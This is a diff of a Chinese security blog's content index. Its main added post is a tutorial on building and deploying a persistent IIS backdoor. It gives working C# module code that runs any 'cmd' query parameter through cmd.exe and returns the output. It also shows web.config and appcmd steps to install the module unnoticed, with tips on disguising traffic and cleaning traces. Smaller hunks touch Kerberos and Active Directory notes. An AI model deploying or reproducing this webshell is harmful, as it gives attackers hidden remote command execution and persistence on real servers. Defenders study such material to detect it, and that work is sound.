+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.PreRequestHandlerExecute += <span class="keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do somthing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过new EventHandler()新建一个事件，我们新加事件时需要保证自己的方法和EventHandler方法签名一致。即传递 <code>object sender, EventArgs e</code> 两个参数，返回类型为void。</p>
+<p>在 <code>Context_PreRequestHandlerExecute</code> 中，我们想干什么就干什么。</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    HttpApplication app = (HttpApplication)sender;</span><br><span class="line">    HttpRequest request = app.Context.Request;</span><br><span class="line">    HttpResponse response = app.Context.Response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过sender拿到HttpApplication上下文。有了request和response我们就可以拿到参数，执行命令拿到结果，然后写入response了。</p>
+<p>接下来是示例。</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.PreRequestHandlerExecute += <span class="keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpApplication app = (HttpApplication)sender;</span><br><span class="line">            HttpRequest request = app.Context.Request;</span><br><span class="line">            HttpResponse response = app.Context.Response;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> cmd = request.QueryString.Get(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                Process proc = <span class="keyword">new</span> Process();</span><br><span class="line">                proc.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">                proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">                proc.Start();</span><br><span class="line">                proc.StandardInput.WriteLine(cmd);</span><br><span class="line">                proc.StandardInput.WriteLine(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">                <span class="built_in">string</span> outStr = proc.StandardOutput.ReadToEnd();</span><br><span class="line">                proc.Close();</span><br><span class="line">                response.Clear();</span><br><span class="line">                response.BufferOutput = <span class="literal">true</span>;</span><br><span class="line">                response.Write(outStr);</span><br><span class="line">                response.End();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception err)</span><br><span class="line">            &#123;</span><br><span class="line">                response.Write(err.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从参数中获取cmd，然后写入resp。编译dll之后来部署dll。</p>
+<h2 id="部署后门"><a href="#部署后门" class="headerlink" title="部署后门"></a>部署后门</h2><p><a href="https://docs.microsoft.com/en-us/iis/develop/runtime-extensibility/developing-iis-modules-and-handlers-with-the-net-framework#deploying-the-assembly-to-the-server">微软文档</a>中使用的图形化部署。</p>
+<p>先添加模块</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage29.jpg"></p>
+<p>再添加模块映射关系。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage3u73tc$3.jpg"></p>
+<p>而对渗透来说rdp过于拉跨，这里提供一种使用web.config部署的方法。在web.config中</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">&quot;IIS_BackDoor&quot;</span> <span class="attr">type</span>=<span class="string">&quot;IIS_BackDoor.MyModule&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以将模块放入bin目录，然后编辑web.config加入system.webServer-&gt;modules节点，无需重启即可生效。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownQQ%E6%88%AA%E5%9B%BE20221221152416.png"></p>
+<p><strong>部署的时候需要注意，根据iis的运行模式不同，web.config的修改位置也不一样。</strong></p>
+<p>经典模式修改位置位于 <code>&lt;httpModules&gt;&lt;/httpModules&gt;</code> 标签内。集成模式修改位置位于 <code>&lt;modules&gt;&lt;/modules&gt;</code> 内。<a href="https://my.oschina.net/u/3797416/blog/3159732">具体参考 IIS7中的“经典”和“集成”管道模式有什么区别？</a></p>
+<p>或者使用appcmd命令安装，需要管理员权限。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\Windows\system32\inetsrv&gt; .\appcmd.exe list app</span><br><span class="line">APP <span class="string">&quot;Default Web Site/&quot;</span> (applicationPool:DefaultAppPool)</span><br><span class="line">PS C:\Windows\system32\inetsrv&gt; .\appcmd.exe add module /name:IIS_BackDoor /type:IIS_BackDoor.MyModule /app.name:<span class="string">&quot;Default Web Site/&quot;</span></span><br><span class="line">已添加 MODULE 对象“IIS_BackDoor”</span><br></pre></td></tr></table></figure>
+
+<h2 id="一些坑"><a href="#一些坑" class="headerlink" title="一些坑"></a>一些坑</h2><ol>
+<li>部署后门前最好先上cs，不然网站崩了直接gg。</li>
+<li>虽然是net4.8编译的，但是写自己代码的时候可能会有一些api和低版本的不兼容。</li>
+<li>vs2022 anycpu编译的dll，根据iis的运行位数和系统位数不同还是可能会崩，具体部署时应该根据目标实际架构重新编译。</li>
+</ol>
+<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><p>iis后门不仅仅可以用来做 <code>runcmd</code> 的实现，一键注入内存shell、HttpListener端口复用、直接运行shellcode、powershell，都是很实用的功能。</p>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>还可以通过：</p>
+<ol>
+<li>更改模块入口点</li>
+<li>更改调用事件</li>
+<li>对请求伪装，或 HttpHead 判断来对流量分类</li>
+</ol>
+<p>反正持久化就是伪装的更像正常事件，如果没注意清理痕迹，在好的持久化也没用。</p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a href="https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/">Malicious IIS extensions quietly open persistent backdoors into servers</a><br><a href="https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/">IIS modules: The evolution of web shells and how to detect them</a><br><a href="https://attack.mitre.org/techniques/T1505/004/">ATTCK</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>后门</tag>
+        <tag>持久化</tag>
+        <tag>IIS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ESP脱壳定理</title>
     <url>/%E8%84%B1%E5%A3%B3/ESP%E8%84%B1%E5%A3%B3%E5%AE%9A%E5%BE%8B/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对加壳和脱壳做了段时间的研究和了解，写一篇文记录下(以UPX壳为例)</p>
@@ -1087,7 +1412,7 @@
 <ul>
 <li>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal 如dailker</li>
 <li>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) 如krbtgt，cifs</li>
-<li>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:&#x75;&#115;&#x65;&#x72;&#x40;&#x64;&#111;&#x6d;&#97;&#x69;&#x6e;&#46;&#99;&#111;&#x6d;">&#x75;&#115;&#x65;&#x72;&#x40;&#x64;&#111;&#x6d;&#97;&#x69;&#x6e;&#46;&#99;&#111;&#x6d;</a><br>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href='#p1'>相关的安全问题&gt;用户名枚举</a></li>
+<li>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#100;&#111;&#x6d;&#x61;&#x69;&#110;&#46;&#x63;&#111;&#x6d;">&#117;&#115;&#x65;&#114;&#x40;&#100;&#111;&#x6d;&#x61;&#x69;&#110;&#46;&#x63;&#111;&#x6d;</a><br>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href='#p1'>相关的安全问题&gt;用户名枚举</a></li>
 </ul>
 </li>
 <li><p>sname<br>PrincipalName 类型<br>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>
@@ -3187,7 +3512,7 @@
 <p>值得注意的是，displayName不能用于登陆，虽然跟域用户名往往一样。但是这个不是直接用于登陆的我们登陆用的账号，在一些公司里面，displayName往往是中文，登陆的用户名是拼音。登陆的格式有以下两种格式。</p>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188d6994cbdbc4240.png"></p>
 <ol start="4">
-<li>第一种格式是UserPrincipalName，我们简称为UPN，一般的格式是用户名@域名这样的格式。<br>​<br>比如这里就是<a href="mailto:&#x6c;&#x69;&#115;&#105;&#x40;&#x74;&#x65;&#115;&#116;&#46;&#x6c;&#x6f;&#x63;&#97;&#108;">&#x6c;&#x69;&#115;&#105;&#x40;&#x74;&#x65;&#115;&#116;&#46;&#x6c;&#x6f;&#x63;&#97;&#108;</a></li>
+<li>第一种格式是UserPrincipalName，我们简称为UPN，一般的格式是用户名@域名这样的格式。<br>​<br>比如这里就是<a href="mailto:&#x6c;&#x69;&#x73;&#105;&#64;&#116;&#101;&#115;&#116;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;">&#x6c;&#x69;&#x73;&#105;&#64;&#116;&#101;&#115;&#116;&#46;&#x6c;&#111;&#x63;&#97;&#x6c;</a></li>
 </ol>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e2811e15d3228c71.png"></p>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b73488011e5e86a7.png"></p>
